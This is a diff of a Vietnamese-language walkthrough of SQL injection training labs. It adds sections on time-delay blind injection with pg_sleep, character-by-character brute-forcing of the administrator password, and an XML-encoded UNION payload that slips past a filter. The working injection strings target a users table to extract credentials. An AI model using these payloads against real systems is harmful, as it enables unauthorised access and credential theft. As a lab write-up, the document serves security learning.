@@ -46,9 +46,9 @@ Thay URL thành `/filter?category=Pets%27%20UNION%20SELECT%20NULL,%27a%27--`, k�
 
 ![image](https://user-images.githubusercontent.com/103978452/201869031-2f95a213-131d-4c13-abb8-068e8bada6c4.png)
 
-Để lấy password, ta thay URL thành `/filter?category=Pets%27%20UNION%20SELECT%20NULL,password%20FROM%20users--`. Password ở vị trí tương ứng với username=administrator (vị trí thứ hai) chính là password ta cần tìm.
+Để lấy password của administrator, ta thay URL thành `/filter?category=Pets%27%20UNION%20SELECT%20NULL,password%20FROM%20users%20where%20username=%27administrator%27--`.
 
-![image](https://user-images.githubusercontent.com/103978452/201869200-46e69891-1d51-413c-be36-36c145b9e45f.png)
+![image](https://user-images.githubusercontent.com/103978452/201936283-bfdb10e0-3da9-4ea0-afe6-c7d2f6233463.png)
 
 Sử dụng username và password thu được để đăng nhập, kết quả thành công.
 
@@ -143,3 +143,40 @@ Thay đổi cookie TrackingId thành `tjUeQ8E2Evymji7b' and 1=(select case when 
 Thực hiện tương tự với `substr(password,2,1)`, `substr(password,3,1)`, ... đến `substr(password,20,1)`, cuối cùng ta thu được password="f4l51zsvc29fylpb93sa".
 
 Sử dụng thông tin đã có để đăng nhập, kết quả thành công.
+
+# 13. Blind SQL injection with time delays
+Thay đổi cookie TrackingId thành `89d7JFSK1gQf8Kja'%3bSELECT pg_sleep(10)--`, response bị delay 10s.
+
+![image](https://user-images.githubusercontent.com/103978452/201924259-1c1de137-30e6-440e-9c73-ac9e2a575efc.png)
+
+# 14. Blind SQL injection with time delays and information retrieval
+Thêm `'%3bSELECT pg_sleep(10)--` vào sau cookie TrackingId, kết quả bị delay 10s. Như vậy website có lỗi SQLi.
+
+Thêm `'%3bSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE 'a' END--` vào sau TrackingId, ta thấy bị delay 10s. Nhưng khi thay đổi `1=1` thành `1=2` thì không bị delay. Như vậy ta sẽ dùng lệnh SELECT CASE WHEN để exploit
+
+Bruteforce độ dài password: Thêm `'%3bSELECT CASE WHEN length(password)=10 THEN pg_sleep(5) ELSE 'a' END FROM users WHERE username='administrator'--` vào sau TrackingId rồi tiến hành bruteforce, ta thấy chỉ với length=20 thì thời gian nhận response lên tới 5 giây. Như vậy độ dài password là 20.
+
+![image](https://user-images.githubusercontent.com/103978452/201925671-f7c85e19-0f97-4bb0-b4e8-d321e055003c.png)
+
+Bruteforce password: Thêm `'%3bSELECT CASE WHEN substr(password,1,1)='a' THEN pg_sleep(8) ELSE 'a' END FROM users WHERE username='administrator'--` vào sau TrackingId, ta thấy chỉ với ký tự 'a' thì response trả về lên tới 8 giây. Như vậy password bắt đầu với 'a'.
+
+![image](https://user-images.githubusercontent.com/103978452/201926618-606202b4-bc13-4df9-8f83-6c3f6f5a2551.png)
+
+Tiến hành tương tự với các ký tự từ 2 đến 20, ta thu được password=afwrv9geoqal4yozoxw0. Sử dụng username và password có được để đăng nhập, kết quả thành công.
+
+# 15. Blind SQL injection with out-of-band interaction
+
+# 16. Blind SQL injection with out-of-band data exfiltration
+
+# 17. SQL injection with filter bypass via XML encoding
+Dùng BurpSuite để bắt request check stock. Ta thấy phần body của request là một đoạn XML gồm productId và storeId. Khi ta thêm `&#45;&#45;` (tương ứng -- khi XML encode) vào sau storeId, kết quả trả vễ vẫn như bình thường. Như vậy, website có lỗ hổng SQLi.
+
+Khi ta thêm `&#32;UNION&#32;SELECT&#32;NULL&#45;&#45;` vào sau storeId, ta thấy giá trị null được trả về. Như vậy ta hoàn toàn có thể exploit bằng lệnh UNION. 
+
+![image](https://user-images.githubusercontent.com/103978452/201933578-b6ca45f0-3cd3-473b-a163-14160c6b64a3.png)
+
+Để lấy password của administrator, ta thêm `&#32;UNION&#32;SELECT&#32;password&#32;from&#32;users&#32;where&#32;username&#61;&#39;administrator&#39;&#45;&#45;` (tương ứng " UNION SELECT password where username='administrator') vào sau storeId
+
+![image](https://user-images.githubusercontent.com/103978452/201935676-a466eb13-300e-4f76-a66e-bb7ac2618af5.png)
+
+Sử dụng thông tin đã có để login, ta được kết quả thành công.
